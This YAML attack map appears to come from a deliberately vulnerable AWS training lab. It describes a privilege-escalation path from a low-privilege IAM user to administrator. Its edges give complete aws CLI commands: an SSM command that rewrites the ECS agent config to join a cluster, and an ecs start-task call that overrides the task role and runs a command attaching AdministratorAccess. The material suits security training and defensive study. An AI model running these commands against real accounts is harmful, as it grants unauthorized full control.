attackMap:
  nodes:
    - id: starting-user
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-ecs-007-to-admin-starting-user"
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PassRole, ecs:StartTask, and ssm:SendCommand permissions,
        enabling registration of an unregistered EC2 instance to an ECS cluster and
        subsequent task launch with overridden role and command parameters.

    - id: ec2-instance
      label: "Unregistered EC2 Instance"
      type: resource
      subType: ec2-instance
      arn: "arn:aws:ec2:{region}:{account_id}:instance/INSTANCE_ID"
      description: >
        An ECS-optimized EC2 instance with the ECS agent installed but not yet registered
        to any cluster. By sending an SSM command to overwrite the ECS agent configuration
        and restart it, you can cause this instance to call ecs:RegisterContainerInstance
        and join the target cluster under your direction.

    - id: ecs-cluster
      label: "ECS Cluster"
      type: resource
      subType: ecs-task
      arn: "arn:aws:ecs:{region}:{account_id}:cluster/pl-prod-ecs-007-cluster"
      description: >
        The target ECS cluster that starts empty with no registered container instances.
        Once the EC2 instance is reconfigured via SSM and the ECS agent restarts, it
        registers itself to this cluster, making it available as a placement target for
        ecs:StartTask.

    - id: target-role
      label: "Admin Target Role"
      type: principal
      subType: iam-role
      isTarget: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-ecs-007-to-admin-target-role"
      description: >
        This IAM role has AdministratorAccess and trusts ecs-tasks.amazonaws.com. By
        passing this role via the taskRoleArn override in ecs:StartTask and overriding
        the container command to attach AdministratorAccess to the starting user, the
        ECS task runs with full admin credentials and escalates your privileges.

  edges:
    - from: starting-user
      to: ec2-instance
      label: "ssm:SendCommand"
      description: >
        Send an SSM command to the unregistered EC2 instance to overwrite the ECS agent
        configuration, setting ECS_CLUSTER to the target cluster, then restart the ECS agent.
      hints:
        - "You have permissions to send commands to EC2 instances."
        - "An EC2 instance with the ECS agent is running but not assigned to any cluster — it can be redirected."
        - "The ECS agent reads its cluster assignment from /etc/ecs/ecs.config at startup. Use ssm:SendCommand to overwrite ECS_CLUSTER and restart the agent."
      commands:
        - description: "Retrieve the EC2 instance ID from Terraform outputs"
          command: "INSTANCE_ID=$(terraform output -json | jq -r '.single_account_privesc_one_hop_to_admin_ecs_007_iam_passrole_ecs_starttask_ecs_registercontainerinstance.value.ec2_instance_id')"
        - description: "Send SSM command to reconfigure the ECS agent and restart it"
          command: "aws ssm send-command --instance-ids \"$INSTANCE_ID\" --document-name \"AWS-RunShellScript\" --parameters 'commands=[\"echo ECS_CLUSTER=pl-prod-ecs-007-cluster >> /etc/ecs/ecs.config\",\"systemctl restart ecs\"]'"

    - from: ec2-instance
      to: ecs-cluster
      label: "ecs:RegisterContainerInstance"
      description: >
        The restarted ECS agent automatically calls ecs:RegisterContainerInstance using
        the instance's IAM role credentials, adding the EC2 instance to the target cluster
        as an available container instance.
      hints:
        - "The cluster is empty. You need a container instance before you can start tasks."
        - "After the ECS agent restarts, use ecs:ListContainerInstances to confirm the instance appeared in the cluster."
      commands:
        - description: "Wait for the instance to register, then list container instances"
          command: "aws ecs list-container-instances --cluster pl-prod-ecs-007-cluster"

    - from: starting-user
      to: target-role
      label: "ecs:StartTask + iam:PassRole"
      description: >
        Use ecs:StartTask with --overrides to launch the existing task definition on the
        newly-registered container instance. Override taskRoleArn to specify the admin role
        and override the container command to attach AdministratorAccess to the starting user.
      hints:
        - "You can start ECS tasks and pass roles. Look for a task definition you can exploit."
        - "ecs:StartTask accepts an --overrides parameter that lets you substitute the task role and override container commands at launch time."
        - "Browse to https://pathfinding.cloud/paths/ecs-007 for technique details."
      commands:
        - description: "Retrieve the container instance ARN"
          command: "CONTAINER_INSTANCE_ARN=$(aws ecs list-container-instances --cluster pl-prod-ecs-007-cluster --query 'containerInstanceArns[0]' --output text)"
        - description: "Start the task with role and command overrides"
          command: "aws ecs start-task --cluster pl-prod-ecs-007-cluster --task-definition pl-prod-ecs-007-existing-task --container-instances \"$CONTAINER_INSTANCE_ARN\" --overrides '{\"taskRoleArn\":\"arn:aws:iam::{account_id}:role/pl-prod-ecs-007-to-admin-target-role\",\"containerOverrides\":[{\"name\":\"existing-container\",\"command\":[\"aws\",\"iam\",\"attach-user-policy\",\"--user-name\",\"pl-prod-ecs-007-to-admin-starting-user\",\"--policy-arn\",\"arn:aws:iam::aws:policy/AdministratorAccess\"]}]}'"
        - description: "Verify administrator access"
          command: "aws iam list-users --max-items 1"
